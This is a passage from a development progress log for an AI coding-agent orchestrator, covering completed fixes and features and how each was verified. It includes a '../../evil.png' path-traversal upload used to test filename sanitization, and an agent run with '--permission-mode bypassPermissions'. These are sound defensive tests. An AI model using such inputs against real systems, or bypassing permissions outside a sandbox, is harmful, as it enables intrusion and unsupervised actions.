  Stop now shows the exact confirm copy and only sends `{drain:false}` on
  acceptance. B21 was verified by dispatching real `DragEvent`s (U3's
  technique) for both a rejected move (toast shows the server's actual 400
  message) and a valid one (silent, task genuinely updates server-side).
- S7 (PR #65): live-verified against the real *built* server (not the mock),
  since the mock server's simplified paths aren't representative of what
  actually ships to production logs — booted with a real `API_TOKEN`,
  connected a real WebSocket with the token in the query string via Node's
  native `WebSocket`, and confirmed via `grep -c` on the log file that the
  real token string appears zero times, while the redacted line reads
  `/ws?token=[redacted]`.
- B22 (PR #66): the fix needed a third state beyond "no schedule" / "valid
  schedule" — a `projectConfigFormError()` helper distinguishes "the user
  hasn't touched schedule fields at all" (fine, clears the schedule) from
  "some sign of intent but incomplete for the current mode" (blocks save).
  Live-verified both trigger paths that motivated the bug: blanking one of
  two paired fields (daily's hour/minute), and switching the mode dropdown
  when the new mode's own field is empty — both disable Save with a visible
  reason and leave the previously stored schedule untouched, confirmed via a
  live `GET` after each blocked-save attempt.
- B23+B24 (PR #67): B23's boot-time integration test surfaced a genuine,
  correct interaction with B10 worth recording — an old *pending* approval
  seeded before boot gets converted to `expired_restart` by B10's unrelated
  boot-time sweep before B23's pruning ever runs, so it becomes fair game
  for age-based pruning like any other resolved notification (this is
  correct: B23's "never prune a pending approval" guarantee is precise and
  was proven directly against `pruneNotifications()` with a *live* pending
  approval, decoupled from B10's boot semantics, in a separate standalone
  script). B24's Android-throws-on-construction path was live-verified by
  substituting a fake `window.Notification` class whose constructor throws
  — confirmed the new amber warning renders, then repeated with a
  succeeding fake to confirm the ordinary green "Enabled." path still
  works unchanged.

### Phase 11 — Part 6: owner-requested QoL wave + audit fixes — ✅ DONE

| Item | Status | PR |
|---|---|---|
| B25 — USER_GUIDE's `tailscale serve` example uses the wrong port | ✅ done | [#79](https://github.com/IngeniousArtist/hoopedorc/pull/79) |
| B26 — old pending approvals can fall off the notification fetch | ✅ done | [#79](https://github.com/IngeniousArtist/hoopedorc/pull/79) |
| B27 — `update.sh` systemd-unit detection is version-fragile | ✅ done | [#79](https://github.com/IngeniousArtist/hoopedorc/pull/79) |
| T1 — real `@orc/server` test package | ✅ done | [#80](https://github.com/IngeniousArtist/hoopedorc/pull/80) |
| F27 — plan-mode attachments (images/PDF/files → project context folder) | ✅ done | [#81](https://github.com/IngeniousArtist/hoopedorc/pull/81) |
| F28 — plan-chat history archived as markdown session files | ✅ done | [#81](https://github.com/IngeniousArtist/hoopedorc/pull/81) |
| F31 — engineering guidelines (coding/UX/security) in author+validator prompts | ✅ done | [#82](https://github.com/IngeniousArtist/hoopedorc/pull/82) |
| F29 — documentation guidelines for the docs-role model | ✅ done | [#83](https://github.com/IngeniousArtist/hoopedorc/pull/83) |
| F30 — per-task documentation stage in the merge pipeline | ✅ done | [#84](https://github.com/IngeniousArtist/hoopedorc/pull/84) |
| F32 — rate-limit wait-and-retry + fallback alerts on Telegram | ✅ done | [#85](https://github.com/IngeniousArtist/hoopedorc/pull/85) |
| F33 — model test round-trip shows the model's own reply | ✅ done | [#86](https://github.com/IngeniousArtist/hoopedorc/pull/86) |
| F34 — skills strategy: docs + per-project skill hints in prompts | ✅ done | [#87](https://github.com/IngeniousArtist/hoopedorc/pull/87) |
| F35 — quota usage in the Setup health panel | ✅ done | [#88](https://github.com/IngeniousArtist/hoopedorc/pull/88) |

Work top-down in the suggested batches: (1) B25–B27 together; (2) T1;
(3) F27+F28; (4) F31; (5) F29; (6) F30; (7) F32; (8) F33; (9) F34;
(10) F35. Tagged `v0.3.0` when the wave closed (the standing
wave-boundary tagging rule from Part 4). **This closes out Phase 11 and
Part 6 — every item in Parts 1–6 of this plan is now done.**

**Batch 1 (B25–B27, PR #79) — done.** All three verified with more than
typecheck/build: B26 against a real in-memory SQLite DB via the actual
`repo.ts` functions (a pending approval seeded older than 250 newer
responded notifications still surfaces at both the default limit and a
small one, with no duplicate when the pending row is already in-window);
B27 by faking `systemctl` in `PATH` to reproduce the exact old-systemd
"exits 0 with zero matches" quirk the fix targets, confirming the new
output-based check falls through to the manual-restart path instead of
firing `sudo systemctl restart` against a nonexistent unit (also checked
the real-match and no-systemctl-at-all cases). Full evidence in the PR
description.

**T1 (PR #80) — done.** New `@orc/server` test script (`node --import
tsx --test`, same runner engine/adapters already use) wired into CI;
35 new tests across `scheduler.test.ts` (13, F19/A3's isScheduleDue
cases), `budget.test.ts` (7, F16's checkModelQuota window math),
`db/backup.test.ts` (3, F17's three runBackup scenarios against real
files on disk), `db/repo.test.ts` (8, B23's pruneNotifications
pending-approval exemption + B26's getNotifications fix), and
`log-redact.test.ts` (4, S7's redactTokenFromUrl — extracted out of
index.ts into its own module so it's importable without booting the
server via index.ts's top-level `main()` call).

**F27+F28 — done.** New `@fastify/multipart` (9.x line, confirmed
compatible with this repo's `fastify@^5.1.0` via a real build) backs
three new routes (`GET`/`POST`/`DELETE .../plan/attachments`,
`packages/server/src/attachments.ts`) storing uploads at
`context/attachments/<name>` in the project's clone — S-item-grade
validation (basename-only, `[A-Za-z0-9._-]` charset, extension
allowlist, 25MB cap, `-2`/`-3`… collision suffixing, containment
double-checked independent of the sanitizer). `buildChatPrompt`/
`buildDeconstructPrompt` (planner.ts) gain an "Attached context files"
block naming them for the planner's own file tools; empty when there
are none. F28's `plan-sessions.ts` archives every planning session as
`context/plan-sessions/<YYYY-MM-DD-HHmm>.md` (new `planning_session_file`
DB column), rewritten wholesale on each chat/deconstruct turn and
finalized with a `## Committed` line at commit (which also clears the
field so the next chat mints a genuinely new file) — minting dedupes
against the directory (`-2` suffix) since two sessions can land in the
same clock-minute, a real collision a first-draft version of this code
had and a test caught. `ENV.mock` roots both attachments and session
files in a scratch tmp dir (shared `context-dir.ts` helper) instead of
the seed project's real `localPath: "."`, so `npm run mock` stays
exercisable without dirtying this repo. PlanView.tsx: an attach button
+ chips (seeded from `GET` on mount, survive reload) above the chat
composer; a new `apiUpload()` in `client.ts` mirrors `api()`'s
auth/401-retry handling with a `FormData` body instead of JSON.
Verified: typecheck/build green across every workspace; `npm test -w
@orc/engine` (32/32) and `-w @orc/adapters` (4/4) unaffected; `npm test
-w @orc/server` 67/67 (16 new: 10 for the attachments module's pure
storage-safety logic, 6 for plan-sessions' mint/rewrite/collision/
read-only-directory behavior — all against real fs, no mocks).
**Live-verified end-to-end against a real (non-mock) built server**
with a throwaway local git repo (`git init` + a matching `origin`
remote — satisfies `ensureClone`'s fast path with no real GitHub repo
or network needed) standing in for a project: uploaded a real file via
curl multipart, confirmed it landed correctly sanitized on disk; a
`../../evil.png` traversal attempt landed as `evil.png` *inside*
`context/attachments/`, not outside it; a disallowed extension and an
oversized file both correctly rejected (400/413); deleted it and
confirmed a 404 on a second delete. Then the one genuinely
un-unit-testable claim: **a real `claude -p` chat call** with a
`context/attachments/notes.txt` file reading "The secret ingredient is
basil." — asked "what's the secret ingredient," got back exactly
`"Basil"`, proving the planner actually read the file with its own
tools rather than guessing. A second real turn confirmed the *same*
session file gets rewritten (not a new one) and now contains both
turns. Total live-verification cost: ~$0.24.

**F31 — done.** New `Settings.guidelines?: { coding?, ux?, security? }`
(`@orc/types`), shipped with real ~15-line-each defaults in
`defaultSettings()`; capped at 4000 chars per field on
`PUT /api/settings`. The actual rendering logic
(`buildEngineeringStandardsBlock`) lives in a new shared
`packages/engine/src/guidelines.ts` — not in either `orchestrator.ts`
or `validator.ts` — specifically so neither has to import from the
other; both call it with the same guidelines and their own
`task.role === "frontend"` check, so the author is told the standards
up front and the validator grades against the *exact same text*. The
validator's prompt gets one extra instruction sentence (flag clear
violations, lean `request_changes` for substantive ones, don't nitpick
unmentioned style) — only present when there's actually a standards
block to reference. Settings.tsx gained a "Guidelines" section (three
labeled textareas) using U4's existing dirty/save machinery unchanged.
Per-project overrides deliberately out of scope (global only, per the
plan). Verified: typecheck/build green across every workspace;
`npm test -w @orc/adapters` (4/4) unaffected; `npm test -w @orc/engine`
**42/42 (10 new)** — `guidelines.test.ts` (6, the pure block-renderer:
undefined/blank guidelines produce nothing, ux excluded when
`includeUx` is false, only configured fields appear, text is trimmed)
plus real dispatch-level integration tests in `orchestrator.test.ts`
and a new `validator.test.ts` (2 each) that capture the actual prompt
handed to a fake adapter for a frontend vs. non-frontend task, proving
the wiring — not just the pure function — behaves correctly; `npm test
-w @orc/server` unaffected (51/51, no server-side unit tests needed —
the cap validation is a simple inline check, live-verified instead).
**Live-verified against a real (non-mock) built server**: a fresh DB's
`GET /api/settings` already shows the shipped defaults for all three
fields; a 4001-char `guidelines.coding` → 400 with a clear message; a
valid edit round-trips and persists across a fresh GET. Then in a real
browser (`agent-browser`) against that same server: the Guidelines
section renders between Risky Change Rules and Projects with all three
textareas populated (screenshotted); editing a field flips the Save
button from disabled to enabled (proving the dirty-tracking wiring);
saving shows "Settings saved.", re-disables Save, and the edit was
independently confirmed via a follow-up curl GET.

**F29 — done.** New `DOCS_GUIDELINES` const in `packages/engine/src/
guidelines.ts` (README/CHANGELOG/helper-docs standards from the plan) —
a fixed engine constant, not an operator-editable Settings field, per
the plan's own reasoning (three textareas is already enough surface).
`buildEngineeringStandardsBlock` gained a third `includeDocs` parameter
(default `false`, so every existing call site and test stayed
backward-compatible unchanged); both `orchestrator.ts`'s author prompt
and `validator.ts`'s review prompt now pass `task.role === "docs"` for
it, alongside the existing frontend/ux wiring — a docs task's prompt
gets coding + security + docs, matching the plan's explicit note that
this is correct (docs tasks still touch the repo). `buildDocsTaskDraft`
(the standing "Project documentation" task every project gets) now
also demands a CHANGELOG.md and references the quickstart-commands-
must-be-real rule in both its description and acceptance criteria;
`scopePaths` extended to include `CHANGELOG.md`. Verified: typecheck/
build green across every workspace; `npm test -w @orc/adapters` (4/4)
and `-w @orc/server` (51/51) unaffected; `npm test -w @orc/engine`
**48/48 (6 new)** — 4 new cases in `guidelines.test.ts` (docs section
excluded by default, included when `includeDocs` is true, appears even
with zero `Settings.guidelines` configured since `DOCS_GUIDELINES` is
fixed, and the constant's own content covers README/CHANGELOG/
package.json) plus one integration test each in `orchestrator.test.ts`
and `validator.test.ts` capturing the real prompt for a docs-role task
vs. a frontend task. **Live-verified with a real, full pipeline** — not
just a planner chat call like F27/F28's verification, but the actual
author → gates → validator → merge loop: created a real private GitHub
repo via the app's own `createRepo: true` path, materialized a single
real docs-role task via `POST .../tasks` (correctly auto-routed to
`grok` per `routing.byRole.docs`), started the project, and let it run
for real. The validator (claude) approved with reasons that explicitly
cite the guidelines — *"README.md and CHANGELOG.md both exist and
accurately reflect the actual package.json… No fabricated commands,
badges, or feature claims; the README correctly states there are no
runnable scripts rather than inventing ones"* — proving the standard
was genuinely applied, not just present in the prompt. B11's vacuous-
gate rail correctly caught this scratch repo's absent test/lint
scripts and required approval before merging (expected, unrelated to
F29); approved it after eyeballing the actual PR diff via `gh pr diff`
— the README honestly stated "no scripts defined... so there are no
commands to run" instead of inventing any, and CHANGELOG.md followed
Keep-a-Changelog format exactly (`## [0.0.0] - date`, `### Added`).
Task ended `done`, PR genuinely merged on GitHub. Total live-
verification cost: ~$0.19. One cleanup note: the throwaway GitHub repo
(`IngeniousArtist/f29-livetest`) could not be deleted afterward — the
`gh` CLI token on this box lacks the `delete_repo` scope, and granting
it wasn't something to do unilaterally; it's a harmless empty private
repo, delete manually or extend the token's scope
(`gh auth refresh -s delete_repo`) if you want it gone.

**F30 — done.** New `ProjectConfig.perTaskDocs?: boolean` (default true
when unset — the owner's requested standard workflow), validated as a
boolean on `PATCH /api/projects/:id` alongside the other config
booleans. The stage itself (`Orchestrator.runDocsStage`, `orchestrator.ts`)
sits exactly where the plan specified: after the attempts loop exits
approved (past the `prNumber == null` guard) and before
`syncBranchWithMain`, so a documented PR still goes through F15's
GitHub-checks gate and the normal risk-based merge decision unchanged.
Resolves the documenter via `routing.byRole.updates ?? routing.byRole.docs`
— both already default to `grok` in `defaultSettings()`, so a fresh
install gets a working docs stage with zero extra configuration; no
model routed (or its `ModelConfig` missing) warn-logs and skips.
Reuses `emitRunEvent` (given a new optional `runId` param, defaulting to
the existing attempt-based id so every other call site is untouched) to
emit a `run-<taskId>-docs` running→terminal pair through the same
`onRunUpdated` path author runs use — proven live below to actually
reach the `runs`/`costs` tables, not just asserted. A dedicated
`DOCS_STAGE_TIMEOUT_MS` (5 min, `constants.ts`) aborts a hung documenter
via the same `AbortController` map `stopTask` already reaches, so a Stop
press during the docs wait genuinely kills the process instead of being
ignored. Scope is hard-enforced, not just prompted: new
`WorktreeManager.revertOutOfScope(task, allowedPatterns)` diffs
uncommitted changes (`git diff HEAD` for tracked edits + `ls-files
--others` for brand-new files, since a fresh CHANGELOG.md wouldn't show
up in a HEAD diff), reverts tracked edits via `git checkout --` and
deletes untracked ones outright, restricted to `CHANGELOG.md`/
`README.md`/`docs/**`. Every failure path (no model routed, adapter
throws, adapter returns `ok:false`, commit/push throws) warn-logs and
falls through to the normal merge unchanged — only a `bailIfStopRequested`
check placed right after the stage (mirroring F15's identical pattern)
can still cut a documented task off, and only for an actual Stop press,
never a docs failure. Verified: typecheck/build green across every
workspace; `npm test -w @orc/adapters` (4/4) and `-w @orc/server` (51/51)
unaffected; `npm test -w @orc/engine` **52/52 (4 new)** covering all four
acceptance scenarios — (a) the docs stage runs after approval and before
the merge (asserted via call ordering, not just both happening), the
task still ends `done`, and a `running`→`passed` run-row pair lands
under the `run-<taskId>-docs` id; (b) a documenter that throws doesn't
fail the task or block the merge, warn-logged, no `docs:` commit made;
(c) `perTaskDocs: false` never invokes the documenter model at all; (d)
an out-of-scope documenter edit is reverted (asserted against the exact
`["CHANGELOG.md", "README.md", "docs/**"]` pattern list) before the docs
commit, which still lands afterward. **Live-verified against a real,
full pipeline** — not a planner chat call, the actual author → gates →
validator → docs → merge loop: booted the real (non-mock) server
against a scratch DB, created a real private GitHub repo
(`IngeniousArtist/f30-livetest`) via the app's own `createRepo: true`
path, materialized one real code task (add `greet.txt`, `deepseek-flash`,
easy) via `POST .../tasks`, and started the project. The real pipeline
ran exactly as designed: author committed, validator (`claude`) approved,
then **grok** ran the docs stage — its own log stream shows it writing
CHANGELOG.md and then running `git status --short` to confirm only that
file changed before finishing, all within ~21 seconds. B11's vacuous-gate
rail correctly flagged the scratch repo's absent scripts as risky
(expected, unrelated to F30) and held for approval; approving it let
`gh pr merge` complete. `gh pr view --json commits` on the merged PR
shows exactly two commits — `feat: Add a greet.txt file (attempt 1)`
then `docs: Add a greet.txt file` — proving the docs commit genuinely
rode the same PR as the code. The scratch DB's `runs` table has
`run-<taskId>-docs` as `model: grok, status: passed` with a real
21-second `started_at`/`ended_at` span and non-zero `cost_usd`, and that
exact amount appears in the `costs` table too — confirming the reused
`emitRunEvent`/`onRunUpdated` path really does post a cost row for the
docs stage, not just for author runs. One interaction worth recording,
not a bug: the pre-existing mechanical `git.appendChangelogEntry` (a
terse, guaranteed, PR-linked one-liner, written straight to `main` right
after merge — unchanged by F30) still fires independently of the docs
stage, so a project with both enabled ends up with two CHANGELOG
entries for the same change under different date-heading conventions —
confirmed exactly this in the live test's merged `CHANGELOG.md` (a
`## 2026-07-07` mechanical entry alongside grok's own
`## [Unreleased] - 2026-07-08` section). Left as-is rather than
deduping: the mechanical entry is the only one of the two *guaranteed*
to exist (and to carry a PR link) regardless of whether a documenter is
routed or its run succeeds, so dropping it when the docs stage succeeds
would trade a small cosmetic duplication for a real regression risk;
out of this item's narrow scope to redesign. Total live-verification
cost: ~$0.27 (`claude` $0.21 validator + `grok` $0.056 docs + `deepseek-flash`
$0.004 author). Same cleanup note as F29: the throwaway repo
(`IngeniousArtist/f30-livetest`) couldn't be deleted afterward (no
`delete_repo` token scope) — a harmless merged private repo, left in
place.

**F32 — done.** New `RATE_LIMIT_RETRIES` (2) and `RATE_LIMIT_WAIT_MS`
(5 min, `constants.ts`). In the `!authorResult.ok` branch of
`executeTask`, an `exitReason === "rate_limited"` failure now waits and
retries the SAME model up to `RATE_LIMIT_RETRIES` times (new
`Orchestrator.waitOutRateLimit`, polling `this.paused`/`stopRequested`
in 5s slices — a Pause/Stop press mid-wait bails promptly rather than
sleeping the whole duration regardless) before falling through to the
existing fallback-escalation code; each wait bumps `task.maxAttempts` in
lockstep with the for-loop's own `attempts++` so a wait-and-retry cycle
never eats into the task's real attempt budget. New per-task
`rateLimitWaits: Map<string, number>` (cleared in the same `finally` as
`stopRequested`) tracks how many waits a task has used on its current
model, reset to 0 whenever the model actually switches (all four
fallback-switch sites now clear it) so a *new* fallback model gets its
own fair shot at wait-and-retry rather than being kicked to the next
model the instant it's first rate-limited. `stuck`/`error` exit reasons
are untouched — they still escalate immediately, since a hung or
crashing model won't be fixed by waiting and the misclassification risk
only runs one way. New optional `EngineEvents.onModelTrouble?(info)` and
a tiny `Orchestrator.notifyModelTrouble` wrapper, called at all three
places the plan asked for: the *first* wait for a task (not every wait —
one ping, not spam), every fallback-model switch, and a terminal failure
with no fallback left. Read the plan's "there are several" fallback
sites literally against the actual code rather than assuming it meant
just the rate-limited path: there are exactly four "Switching to
fallback model" sites (author-run failure, no-changes-produced,
gates-still-failing, and the `SelfReviewError` validator-collision
catch) and four matching "no fallback left → fail" sites — all eight now
notify (`"fallback"`/`"exhausted"` respectively), not just the
rate-limit-specific one the owner's example happened to describe; this
gives one consistent signal regardless of which pipeline stage produced
the trouble. New `SchedulerDeps.rateLimitWaitMs?: number` overrides the
real 5-minute constant — production leaves it unset, unit tests shrink
it to single-digit milliseconds so a wait-and-retry test doesn't sleep
for real. `EngineRunner.buildOrchestrator` forwards every
`onModelTrouble` event to both a new `kind: "model_trouble"` audit-log
entry and — gated by new `Settings.telegram.modelAlerts` (boolean,
default true when unset, independent of the existing `digest` setting)
— a new `ServerNotifier.modelTrouble` Telegram push
(`TelegramBot.modelTrouble`, a short two-line message: project + task on
one line, model + detail on the next, with a ⏳/🔀/🛑 icon per event
kind). Settings.tsx gained a checkbox next to the digest control.
Verified: typecheck/build green across every workspace; `npm test -w
@orc/adapters` (4/4) and `-w @orc/server` (51/51) unaffected; `npm test
-w @orc/engine` **55/55 (3 new)** covering exactly the plan's three
acceptance scenarios against a real fake-adapter-driven `Orchestrator`,
not a reimplementation — (a) a rate-limited author run fails twice then
succeeds on the 3rd attempt, staying on `deepseek-flash` the whole time
(`modelsUsed` asserted identical across all three calls), ending `done`
with `maxAttempts - attempts` unchanged from its starting headroom
(proving the two waits didn't consume real attempt budget), and exactly
one `rate_limit_wait` `onModelTrouble` call (not two, proving the
one-ping-not-every-wait rule); (b) a model that's rate-limited on every
call exhausts its `RATE_LIMIT_RETRIES` and falls back to
`deepseek-pro`, which then succeeds — `onModelTrouble` saw exactly
`["rate_limit_wait", "fallback"]` in that order; (c) calling `stopTask`
~30ms into a 150ms rate-limit wait (a real, if short, wait — no fake
timers) ends the task `blocked` with nothing merged and confirms the
author adapter was never called a second time. **Telegram side**
verified against the real, unmocked `TelegramBot.modelTrouble`
implementation with a scripted-`fetch` double (the B8 technique — no
real bot token available in this environment): stubbed `globalThis.fetch`
to capture outbound `sendMessage` calls, called the real method for all
three event kinds, and confirmed the actual production code path sends
the right `chat_id`, the right icon per event (⏳/🔀/🛑), and the
project name + task title + model + detail text — not a reimplementation
of the formatting logic. Also live-verified the new
`Settings.telegram.modelAlerts` field against a real running (non-mock)
server: unset by default (absent from a fresh `GET /api/settings`),
settable to `true`/`false` via `PUT`, and persists across a follow-up
`GET` — no model spend needed for this part. Did **not** attempt a full
live author→gates→validator run for this item, unlike F29/F30: unlike
those, F32's central mechanism (a genuine `rate_limited` classification)
can't be organically triggered on demand without either wastefully
exhausting a real subscription's quota or faking the adapter response —
which is exactly what the unit tests above already do against the real
orchestration code, so a "live" run would only re-prove the same author
→ gates → validator plumbing F29/F30 already exercised, not anything
F32-specific.

**F33 — done.** Much smaller than F30/F32 — the plan's own "what exists
already" note was accurate: `testModels` already ran a real prompt
through every enabled model and returned `reply`, and SetupView already
rendered it. Two files, no new types/tests needed. `setup.ts`: the
prompt changed from `"Reply with exactly the two characters: OK"`
(proves liveness, not identity) to `"Say hello and state which AI model
you are (name and version), in one short line."`; the reply capture cap
raised from 80 to 200 chars (`res.summary.trim().slice(0, 200)`) since a
real self-identifying sentence runs longer than "OK". `SetupView.tsx`:
the reply moved from a small muted fine-print footnote to the primary
result line (`text-sm text-neutral-100`, quoted in curly quotes), with
cost/latency demoted to a small caption below it instead of the
top-right corner; the description paragraph was reworded to match the
new prompt, and a new small honesty-note paragraph (per the plan's
explicit ask) tells the user models self-identify approximately and an
exact name match isn't promised — the cost/latency next to the reply is
the real signal the wiring reached a live model. Investigated whether
`/api/setup/test-models` has any mock-mode branching before assuming the
"mock mode unaffected" acceptance line was trivially true — it doesn't:
neither the route nor `@orc/adapters` special-case `ENV.mock` anywhere,
so "Test models" always spends real money regardless of mock/non-mock,
same before and after this change; nothing to break. Verified:
typecheck/build green across every workspace; `npm test -w @orc/engine`
(55/55), `-w @orc/adapters` (4/4), and `-w @orc/server` (51/51) all
unaffected (no test additions — the plan's acceptance criteria for this
item is entirely live/visual, not unit-testable). **Live-verified in a
real browser against a real running (non-mock) server**: first attempt
accidentally exercised a stale `@orc/server` build (rebuilt `@orc/web`
but not `@orc/server` after editing `setup.ts` — caught immediately
because Claude/DeepSeek all replied literally `"OK"`, the tell that the
old prompt was still baked into the running process); rebuilt and
restarted, then re-ran "Test models" for real against six models
(temporarily disabled `glm`/`grok` in Settings to keep the live spend
small, added a throwaway `bogus-model` pointed at a nonexistent
`opencodeModel` for the mis-mapped-model check) — Claude replied *"Hello!
I'm Claude, Sonnet 5 (model ID: claude-sonnet-5)."*, DeepSeek v4 Pro
*"Hello! I'm DeepSeek V4 Pro (deepseek/deepseek-v4-pro)."*, DeepSeek v4
Flash *"Hello! I'm DeepSeek V4 Flash."* — all three rendered as the
primary line with cost/latency correctly demoted to the caption below,
screenshotted. The deliberately mis-mapped model failed visibly (red
dot, `error: no output`) exactly as the acceptance criteria asked;
Nex N2 Pro also failed the same way for unrelated real-world reasons
(OpenRouter free-tier access), incidentally reinforcing that the error
path renders correctly for a genuine, not just a staged, failure. Total
live-verification cost: ~$0.30 (includes the stale-build retry). Next
up: F34.

**F34 — done (PR [#87](https://github.com/IngeniousArtist/hoopedorc/pull/87)).**
New `ProjectConfig.skillHints?: string[]` (validated on `PATCH
/api/projects/:id`: array of strings, each ≤200 chars, ≤20 entries — the
same bounded-prompt-input shape as every other free-text config field).
New `buildSkillsBlock` (`packages/engine/src/guidelines.ts`, alongside
F31's `buildEngineeringStandardsBlock` rather than inline in
`orchestrator.ts`, matching that file's existing "prompt-block builders
live in guidelines.ts" convention) renders a `## Skills` section naming
each hint; `buildAuthorPrompt` gained a `project` parameter (previously
only took `task`/`fixInstructions` — `runAuthor`'s `_project` param was
unused before this, now genuinely used) so it can read
`project.config?.skillHints`. Per the plan's own "figure it out" framing:
this is a nudge, not a mechanism — Claude Code discovers skills on its own
(`~/.claude/skills/` user-level, or the target repo's own
`.claude/skills/`) but only reaches for one reliably when a task
description matches its own trigger phrasing, so naming it explicitly in
the prompt is the actual lever; `opencode` models have no skills concept
at all, so for them the block just reads as ordinary instructions
(harmless, often useful anyway). New textarea in the shared
`ProjectConfigFields` Advanced accordion (one hint per line,
`projectConfigFromForm`/`projectConfigToForm` round-trip it same as every
other field there). New "Using skills with your agents" section in
`USER_GUIDE.md` covering the two-tier policy (universal skills installed
once at user level on the deployment box; project-specific skills
committed to that repo's own `.claude/skills/`) and the
`opencode`-has-no-mechanism caveat. Verified: typecheck/build green across
every workspace; `npm test -w @orc/adapters` (4/4) and `-w @orc/server`
(51/51) unaffected; `npm test -w @orc/engine` **58/58 (2 new)** —
`buildSkillsBlock`'s own pure-function test in `guidelines.test.ts`
(undefined/empty → nothing; each hint renders as a bullet under `##
Skills`) plus an `orchestrator.test.ts` integration test capturing the
real prompt handed to a fake adapter for a project with `skillHints`
configured vs. one without, proving the wiring (not just the pure
renderer) reaches the actual author prompt. Server-side validation
live-verified against a real running (non-mock) server via curl: >20
entries → 400, a >200-char entry → 400, a non-array → 400, a valid hint
round-trips through `PATCH`→`GET`. The Advanced-accordion textarea was
live-verified against `npm run mock` in a real browser: typed a hint,
saved, confirmed the "unsaved"/"Save advanced settings" dirty-tracking
fired and cleared correctly, and a follow-up curl `GET` confirmed
persistence. **The genuinely load-bearing verification, per the plan's
own acceptance criteria** ("a scratch project whose repo has a trivial
committed skill... plus a hint naming it → the marker appears... proving
the nudge → discovery → use chain end-to-end"): built a scratch git repo
with a committed `.claude/skills/write-verification-marker/SKILL.md`
(instructs writing `MARKER.txt` containing a fixed string that appears
nowhere in the prompt or task description), constructed the exact author
prompt `buildAuthorPrompt` would produce (task description mentioning a
"verification marker" + a `## Skills` hint naming the skill), and ran the
real `claude -p --output-format stream-json --verbose --permission-mode
bypassPermissions` invocation against it (matching `ClaudeAdapter`'s
actual spawn args exactly, cwd = scratch repo). The transcript shows an
explicit `"name":"Skill"` tool-use call immediately followed by a
`"name":"Write"` call, and `MARKER.txt` landed with the exact
skill-file-only content — proving discovery-and-invocation actually
happened, not just that the model happened to write a plausible file.
Live-verification cost: ~$0.17.

**F35 — done (PR [#88](https://github.com/IngeniousArtist/hoopedorc/pull/88))
— closes Phase 11 and the entire Part 6 wave.** New
`ModelHealthEntry.windowUsage?: { runs, costUsd, windowHours, maxRuns?,
maxCostUsd? }` (`@orc/types`), populated in `GET /api/setup/model-health`
for exactly the models with a `quota` configured (F16) — computed with the
same `repo.getModelUsageSince(db, model, sinceIso)` call `checkModelQuota`
already uses, so the displayed figures are guaranteed to agree with what
actually gates dispatch, not a parallel reimplementation. `SetupView.tsx`
renders `quota: N/limit runs, $X/$limit in the last Nh` in the existing
per-model health row, switching to amber once either configured limit is
reached or exceeded (mirroring the existing amber "cooling down" badge's
color convention) — models with no quota configured show nothing new, no
new table or chart per the plan's explicit scope. No new pure logic
needed unit tests of its own (the route is a thin, already-tested
`getModelUsageSince` call plus a plain object literal), so `npm test -w
@orc/engine` (58/58) and `-w @orc/server` (51/51) stayed unaffected;
verification leaned on the plan's own suggested bar instead — **live,
against a real running (non-mock) server**: set a real quota
(`windowHours: 24, maxRuns: 5, maxCostUsd: 10`) on the `claude` model via
`PUT /api/settings`, created a real project+task through the app's own
API, seeded 3 real `runs`/`costs` rows ($0.85 each, $2.55 total) directly
against the running server's SQLite file, then confirmed `GET
/api/setup/model-health` returned `windowUsage: { runs: 3, costUsd: 2.55,
windowHours: 24, maxRuns: 5, maxCostUsd: 10 }` — matching the seeded data
exactly — while every other (quota-less) model had no `windowUsage` field
at all. Browser-verified against the real built server (not the mock):
the Model Health panel showed "quota: 3/5 runs, $2.55/$10.00 in the last
24h" for Claude and nothing extra for any other model; lowering
`maxRuns` to 3 (matching current usage) flipped the line to amber,
confirming the at-limit highlight fires on real data, not just in theory.
Tagged `v0.3.0` after both F34 and F35 merged — **Part 6, and the entire
docs/PRODUCTIZATION_PLAN.md (Parts 1–6), is now done.**

### Phase 12 — Part 7: Codex + agents-context + sandbox wave — ✅ DONE

| Item | Status | PR |
|---|---|---|
| B28 — removing/renaming a model leaves dangling routing/task references | ✅ done | [#91](https://github.com/IngeniousArtist/hoopedorc/pull/91) |
| U15 — approve/reject buttons visually identical on Notifications | ✅ done | [#93](https://github.com/IngeniousArtist/hoopedorc/pull/93) |
| U16 — estimate copy duplication + fake-precision cost formatting | ✅ done | [#93](https://github.com/IngeniousArtist/hoopedorc/pull/93) |
| U17 — Projects-row orphan "·" + pause/stop icon inconsistency | ✅ done | [#93](https://github.com/IngeniousArtist/hoopedorc/pull/93) |
| U18 — unknown hash silently ignored, URL and UI disagree | ✅ done | [#93](https://github.com/IngeniousArtist/hoopedorc/pull/93) |
| F36 — Codex CLI as a first-class runner | ✅ done | [#95](https://github.com/IngeniousArtist/hoopedorc/pull/95) |
| F37 — swappable planner runner (Claude Code ↔ Codex) | ✅ done | [#97](https://github.com/IngeniousArtist/hoopedorc/pull/97) |
| F38 — AGENTS.md generation in the planning pipeline | ✅ done | [#99](https://github.com/IngeniousArtist/hoopedorc/pull/99) |
| F13-P1 — gates-only Docker sandbox (phase 1 of docs/specs/sandbox.md) | ✅ done | [#101](https://github.com/IngeniousArtist/hoopedorc/pull/101) |
| F39 — EC2 deploy checklist, prebuilt systemd start, Apple-split docs | ✅ done | [#103](https://github.com/IngeniousArtist/hoopedorc/pull/103) |
| B29 — `ensureDeps` fingerprints the stale primary clone, not the merged worktree | ✅ done | [#104](https://github.com/IngeniousArtist/hoopedorc/pull/104) |

All ten items merged to `main`; `npm run typecheck` and `npm test -w
@orc/engine` (81/81, 3 new) green as of each merge. B29 (last item) was
also live-verified end-to-end against a real git remote + primary clone +
two real `create()` calls, with a `package.json` change pushed to origin
between them to simulate a merge — primary's manifest was confirmed stale
before the second call and correctly synced after it. Tagged `v0.4.0`.

### Phase 13 — Part 8: remote-supervision wave — ✅ DONE

| Item | Status | PR |
|---|---|---|
| B30 — restart during a pending approval re-runs the whole task | ✅ done | [#109](https://github.com/IngeniousArtist/hoopedorc/pull/109) |
| F40 — Telegram command wave (`/autonomous`, `/pending`, `/stopall`, `/retry`, `/digest`, `/health`) | ✅ done | [#111](https://github.com/IngeniousArtist/hoopedorc/pull/111) |
| F41 — optional hold-dispatch while an approval is pending | ✅ done | [#113](https://github.com/IngeniousArtist/hoopedorc/pull/113) |
| F43 — `sandboxGates` toggle in the Settings UI | ✅ done | [#115](https://github.com/IngeniousArtist/hoopedorc/pull/115) |
| F42 — `deploy/ec2-bootstrap.sh` | ✅ done | [#117](https://github.com/IngeniousArtist/hoopedorc/pull/117) |

All five items merged to `main`; `npm run typecheck`, `npm test -w
